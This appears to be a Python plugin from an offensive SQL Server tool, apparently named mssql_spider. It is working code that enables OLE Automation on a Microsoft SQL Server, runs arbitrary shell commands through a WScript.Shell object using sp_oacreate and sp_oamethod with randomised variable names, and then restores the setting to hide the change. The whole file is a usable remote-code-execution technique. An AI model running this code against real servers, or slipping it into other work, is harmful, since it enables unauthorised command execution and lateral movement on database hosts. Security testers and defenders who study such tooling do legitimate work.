from argparse import Namespace
from typing import Any
import random
import string

from mssql_spider.client import MSSQLClient


def visitor(opts: Namespace, client: MSSQLClient) -> dict[str, Any]:
    exec_olecmd(client, opts.olecmd)
    return {}


def exec_olecmd(client: MSSQLClient, command: str) -> None:
    enabled = ole_automation_enabled(client)
    if not enabled:
        enable_ole_automation(client)
    output, program = random_string(), random_string()
    try:
        client.query((
            f'DECLARE @{output} int;'
            f'DECLARE @{program} varchar(255);'
            f'SET @{program}=\'Run("{command}")\';'
            f"EXEC master.dbo.sp_oacreate 'WScript.Shell', @{output} out;"
            f'EXEC master.dbo.sp_oamethod @{output}, @{program};'
            f'EXEC master.dbo.sp_oadestroy @{output};'
        ))
    finally:
        if not enabled:
            disable_ole_automation(client)


def enable_ole_automation(client: MSSQLClient) -> None:
    client.configure('show advanced options', True)
    client.configure('Ole Automation Procedures', True)


def disable_ole_automation(client: MSSQLClient) -> None:
    client.configure('Ole Automation Procedures', False)
    client.configure('show advanced options', False)


def ole_automation_enabled(client: MSSQLClient) -> bool:
    rows = client.query("SELECT convert(int, isnull(value, value_in_use)) AS 'value' FROM sys.configurations WHERE name='Ole Automation Procedures'");
    assert len(rows) == 1
    return bool(rows[0]['value'])


def random_string(length: int = 16) -> str:
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
